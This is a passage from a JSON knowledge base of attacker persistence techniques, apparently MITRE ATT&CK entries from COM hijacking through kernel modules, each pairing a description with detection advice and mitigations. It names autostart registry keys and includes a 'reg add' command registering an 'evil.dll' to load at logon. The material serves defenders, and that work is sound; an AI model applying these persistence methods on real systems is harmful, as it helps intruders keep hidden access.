uses local DLLs, this variation may leverage the \"script:\" moniker to execute remote scripts hosted on external servers. <a href=\"https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RELIAQUEST)</a> This approach enables stealthy execution of code while maintaining persistence, as the remote payload would be automatically downloaded whenever the hijacked COM object is accessed.","detection":"There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\. <a href=\"https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic COM Hijacking)</a> Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.","platforms":["Windows"],"dataSources":["Process: Process Creation","Module: Module Load","Windows Registry: Windows Registry Key Modification","Command: Command Execution"],"mitigations":[]},{"id":"T1546.016","name":"Installer Packages","description":"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation. <a href=\"https://cpb-us-e1.wpmucdn.com/sites.psu.edu/dist/4/24696/files/2019/07/psumac2019-345-Installer-Package-Scripting-Making-your-deployments-easier-one-at-a-time.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Installer Package Scripting Rich Trouton)</a>\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS <code>postinstall</code> scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions. <a href=\"https://redcanary.com/blog/mac-application-bundles/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Application Bundle Manipulation Brandon Dalton)</a> <a href=\"https://objective-see.com/blog/blog_0x59.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle evilquest parti)</a> <a href=\"https://securelist.com/operation-applejeus/87553/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows AppleJeus GReAT)</a> <a href=\"https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html#s-mscriptsinstact\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Debian Manual Maintainer Scripts)</a>\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include <code>preinst</code>, <code>postinst</code>, <code>prerm</code>, <code>postrm</code> scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses <code>.msi</code> files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries. <a href=\"https://learn.microsoft.com/windows/win32/msi/installation-procedure-tables-group\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Installation Procedures)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Creation"],"mitigations":[]},{"id":"T1546.017","name":"Udev Rules","description":"Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the <code>/dev</code> directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with <code>match keys</code> to specify the conditions a hardware event must meet and <code>action keys</code> to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in <code>/etc/udev/rules.d/</code>, <code>/run/udev/rules.d/</code>, <code>/usr/lib/udev/rules.d/</code>, <code>/usr/local/lib/udev/rules.d/</code>, and <code>/lib/udev/rules.d/</code>. Rule priority is determined by both directory and by the digit prefix in the rule filename. <a href=\"https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ignacio Udev research 2024)</a> <a href=\"https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Linux Persistence 2024)</a>\n\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as <code>/dev/random</code>, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key <code>RUN+=</code> to detach and run the malicious content’s process in the background to bypass these controls. <a href=\"https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reichert aon sedexp 2024)</a>","detection":"Monitor file creation and modification of Udev rule files in <code>/etc/udev/rules.d/</code>, <code>/lib/udev/rules.d/</code>, and /usr/lib/udev/rules.d/, specifically the <code>RUN</code> action key commands. <a href=\"https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ignacio Udev research 2024)</a>","platforms":["Linux"],"dataSources":["Process: Process Creation","File: File Modification"],"mitigations":[]},{"id":"T1546.018","name":"Python Startup Hooks","description":"Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (<code>.pth</code>) files and the <code>sitecustomize.py</code> or <code>usercustomize.py</code> modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked. <a href=\"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity GlobalProtect CVE 2024)</a>\n\nPath configuration files are designed to extend Python’s module search paths through the use of import statements. If a <code>.pth</code> file is placed in Python's <code>site-packages</code> or <code>dist-packages</code> directories, any lines beginning with <code>import</code> will be executed automatically on Python invocation. <a href=\"https://dfir.ch/posts/publish_python_pth_extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DFIR Python Persistence 2025)</a> Similarly, if <code>sitecustomize.py</code> or <code>usercustomize.py</code> is present in the Python path, these files will be imported during interpreter startup, and any code they contain will be executed. <a href=\"https://docs.python.org/3/library/site.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Python Site Configuration Hook)</a>\n\nAdversaries may abuse these mechanisms to establish persistence on systems where Python is widely used (e.g., for automation or scripting in production environments).","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[]}]},{"id":"T1547","name":"Boot or Logon Autostart Execution","description":"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Authentication Packages)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a> <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a> <a href=\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Programming)</a> These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","detection":"Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.","platforms":["Linux","macOS","Windows","Network Devices"],"dataSources":["Process: OS API Execution","Module: Module Load","Command: Command Execution","File: File Creation","Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification","File: File Modification","Kernel: Kernel Module Load","Process: Process Creation","Driver: Driver Load"],"mitigations":[],"subTechniques":[{"id":"T1547.001","name":"Registry Run Keys / Startup Folder","description":"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. <a href=\"https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Wow6432Node 2018)</a> <a href=\"https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Wow6432Node 2016)</a> The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> <a href=\"https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe RunOnceEx Mar 2018)</a>\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.","detection":"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Modification","Process: Process Creation","Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1547.002","name":"Authentication Package","description":"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Authentication Packages)</a>\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&amp;lt;target binary&amp;gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.","detection":"Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"Windows 8.1, Windows Server 2012 R2, and later versions, may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all DLLs loaded by LSA to be signed by Microsoft. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>"}]},{"id":"T1547.003","name":"Time Providers","description":"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time Feb 2018)</a> W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a>\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a> The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a>\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the <code>DllName</code> value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. <a href=\"https://github.com/scottlundgren/w32time\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github W32Time Oct 2017)</a>","detection":"Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a> There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk. <a href=\"https://github.com/scottlundgren/w32time\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github W32Time Oct 2017)</a>\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Consider using Group Policy to configure and block additions/modifications to W32Time DLLs. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a>"},{"id":"M1024","name":"Restrict Registry Permissions","description":"Consider using Group Policy to configure and block modifications to W32Time parameters in the Registry. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a>"}]},{"id":"T1547.004","name":"Winlogon Helper DLL","description":"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a> \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a>\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.","detection":"Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software that may be executed through the Winlogon helper process by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools like AppLocker <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> that are capable of auditing and/or blocking unknown DLLs."}]},{"id":"T1547.005","name":"Security Support Provider","description":"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a>","detection":"Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>"}]},{"id":"T1547.006","name":"Kernel Modules and Extensions","description":"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. <a href=\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Programming)</a> \n\nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). <a href=\"http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Module Programming Guide)</a> Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users. <a href=\"http://www.megasecurity.org/papers/Rootkits.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iDefense Rootkit Overview)</a>\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC. <a href=\"https://support.apple.com/guide/deployment/system-and-kernel-extensions-in-macos-depa5fb8376f/web\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: System and kernel extensions in macOS)</a>\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces. <a href=\"https://developer.apple.com/support/kernel-extensions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Kernel Extension Deprecation)</a>\n\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well. <a href=\"https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Phalanx2)</a> <a href=\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Linux Rootkit)</a> <a href=\"https://github.com/f0rb1dd3n/Reptile\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Reptile)</a> <a href=\"https://github.com/m0nad/Diamorphine\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Diamorphine)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RSAC 2015 San Francisco Patrick Wardle)</a> <a href=\"https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Synack Secure Kernel Extension Broken)</a> <a href=\"https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Ventir)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Skidmap)</a>","detection":"Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> <a href=\"http://tldp.org/HOWTO/Module-HOWTO/x197.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Loadable Kernel Module Insert and Remove 